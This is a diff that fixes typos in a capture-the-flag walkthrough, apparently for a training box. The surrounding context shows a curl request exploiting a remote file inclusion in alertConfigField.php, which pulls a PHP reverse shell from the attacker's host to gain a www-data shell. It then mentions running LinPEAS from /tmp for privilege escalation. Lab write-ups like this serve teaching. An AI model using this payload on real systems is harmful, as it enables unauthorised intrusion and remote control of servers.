@@ -229,7 +229,7 @@ Finally run the curl command:
 ```
 curl http://10.10.22.10/<inserthiddendirectory>/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.12.213:8000/php-reverse-shell.php
 ```
-We are in and now have access ot the wwww-data shell, we should be able ot find the user flag, which we do in Miles's folder. It is also prudent to have a look around his file system. He won't mind.
+We are in and now have access ot the www-data shell, we should be able to find the user flag, which we do in Miles's folder. It is also prudent to have a look around his file system. He won't mind.
 
 Lets see what LINPEAS (privilege-escalation-awesome-script) can do for us on the host. As the user www-data, cd to a writable folder. In this case I will be using **/tmp**
 
